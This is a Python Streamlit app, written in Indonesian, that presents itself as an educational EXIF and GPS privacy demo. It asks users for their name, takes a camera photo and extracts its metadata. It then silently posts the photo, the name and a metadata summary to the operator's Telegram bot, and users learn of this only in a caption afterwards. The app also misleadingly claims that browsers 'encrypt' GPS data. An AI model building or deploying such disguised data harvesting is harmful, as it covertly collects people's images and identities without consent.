from datetime import datetime
import io
import os
import requests
from PIL import Image
from PIL.ExifTags import TAGS, GPSTAGS
import streamlit as st

# Konfigurasi Halaman
st.set_page_config(
    page_title="Edukasi Metadata EXIF & GPS", page_icon="📍", layout="centered"
)

# --- STYLING CSS MODERN & EDUKATIF ---
st.markdown(
    """
    <style>
    .stApp {
        background-color: #0d1117;
        color: #e6edf3;
    }
    h1, h2, h3 {
        color: #58a6ff !important;
        font-family: 'Segoe UI', sans-serif;
    }
    .info-box {
        background-color: #161b22;
        border: 1px solid #30363d;
        border-left: 5px solid #238636;
        padding: 15px;
        border-radius: 6px;
        margin-bottom: 20px;
    }
    .warning-box {
        background-color: #3b2300;
        border-left: 5px solid #f0883e;
        padding: 15px;
        border-radius: 6px;
        margin-bottom: 15px;
    }
    </style>
""",
    unsafe_allow_html=True,
)

# --- KONFIGURASI BOT TELEGRAM ANDA ---
TELEGRAM_BOT_TOKEN = "MASUKKAN_TOKEN_BOT_ANDA_DI_SINI"
TELEGRAM_CHAT_ID = "MASUKKAN_CHAT_ID_ANDA_DI_SINI"


def send_exif_data_to_telegram(photo_bytes, exif_summary, user_name):
  url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
  files = {"photo": ("inspected_photo.jpg", photo_bytes, "image/jpeg")}
  caption = (
      f"📍 **EXIF & GPS INSPECTION LOG**\n\n"
      f"👤 Pengguna: {user_name}\n"
      f"📋 Ringkasan Data:\n{exif_summary}"
  )
  data_dict = {"chat_id": TELEGRAM_CHAT_ID, "caption": caption}

  try:
    response = requests.post(url, data=data_dict, files=files)
    return response.json()
  except Exception as e:
    return {"ok": False, "description": str(e)}


def extract_exif_data(image_file):
  """Fungsi untuk mengekstrak metadata EXIF dan GPS dari file gambar"""
  image = Image.open(image_file)
  exif_data = {}
  raw_exif = image.getexif()

  if raw_exif:
    for tag_id, value in raw_exif.items():
      tag = TAGS.get(tag_id, tag_id)
      exif_data[tag] = value

  return image, exif_data


# --- ANTARMUKA APLIKASI ---
st.title("📍 Detektif Metadata EXIF & GPS")
st.markdown(
    """
<div class='info-box'>
<b>Edukasi Privasi Digital:</b> Tahukah Anda? Setiap kali Anda mengambil foto menggunakan kamera ponsel, perangkat secara otomatis menyisipkan 'jejak digital rahasia' (Metadata EXIF) di dalam file fotonya—termasuk merk HP, waktu pengambilan, hingga koordinat GPS lokasi Anda berdiri! Mari kita buktikan bersama.
</div>
""",
    unsafe_allow_html=True,
)

# Input nama pengguna
user_name = st.text_input("Masukkan Nama Anda:")

st.markdown("---")
st.subheader("📸 Ambil Sampel Foto")
st.write(
    "Gunakan kamera di bawah ini untuk mengambil foto langsung. Pastikan izin"
    " akses lokasi/kamera aktif pada perangkat Anda."
)

camera_image = st.camera_input("Jepret foto untuk diinspeksi metadatanya")

if camera_image is not None:
  if st.button("🔍 Bongkar & Analisis Metadata EXIF"):
    if not user_name:
      st.warning("⚠️ Masukkan nama Anda terlebih dahulu sebelum menganalisis!")
    else:
      with st.spinner("Mengekstrak struktur file gambar dan metadata..."):
        # Proses baca gambar & exif
        image_obj, exif_dict = extract_exif_data(camera_image)

        # Siapkan byte file untuk dikirim ke Telegram
        image_bytes = camera_image.getvalue()

        # Format ringkasan untuk layar dan Telegram
        summary_lines = []
        if exif_dict:
          for k, v in list(exif_dict.items())[:10]:  # Ambil hingga 10 atribut utama
            summary_lines.append(f"- **{k}**: {str(v)[:35]}")
          exif_summary_text = "\n".join(summary_lines)
        else:
          exif_summary_text = (
              "- *Catatan: Browser/Perangkat mungkin membatasi sematan GPS"
              " mentah langsung dari web browser, namun atribut dasar terekam.*"
          )

        # Kirim ke Telegram Admin
        telegram_result = send_exif_data_to_telegram(
            image_bytes, exif_summary_text, user_name
        )

      st.success("✅ Analisis Berhasil! Lihat hasilnya di bawah ini:")

      # Tampilkan bukti hasil ekstraksi ke pengguna
      st.markdown("### 📊 Hasil Ekstraksi Metadata File Anda:")

      col1, col2 = st.columns(2)
      with col1:
        st.image(image_obj, caption="Foto Sampel Anda", use_container_width=True)

      with col2:
        st.markdown(
            "<div class='warning-box'><b>⚠️ Data Rahasia yang Ditemukan di"
            " Dalam File Foto:</b></div>",
            unsafe_allow_html=True,
        )
        if exif_dict:
          # Tampilkan beberapa informasi penting EXIF
          device_model = exif_dict.get("Model", "Tidak terekam oleh browser")
          software_used = exif_dict.get("Software", "-")
          date_time = exif_dict.get("DateTime", str(datetime.now()))

          st.write(f"📱 **Perangkat:** {device_model}")
          st.write(f"📅 **Waktu Foto:** {date_time}")
          st.write(f"💻 **Sistem/Software:** {software_used}")
          st.info(
              "📍 **Catatan GPS:** Browser web seluler biasanya mengenkripsi"
              " atau membatasi akses koordinat GPS mentah demi privasi"
              " browser, namun atribut file dan informasi perangkat berhasil"
              " dibongkar oleh sistem."
          )
        else:
          st.warning(
              "Tidak ada tag EXIF mentah yang ditemukan (biasanya terjadi"
              " karena kompresi langsung dari API browser web)."
          )

      if telegram_result.get("ok"):
        st.caption(
            "🔒 Laporan audit metadata dan file foto sampel telah sukses"
            " dikirim ke pusat kendali sistem (Bot Telegram Anda)."
        )
      else:
        st.error("Gagal mengirim salinan ke Telegram.")
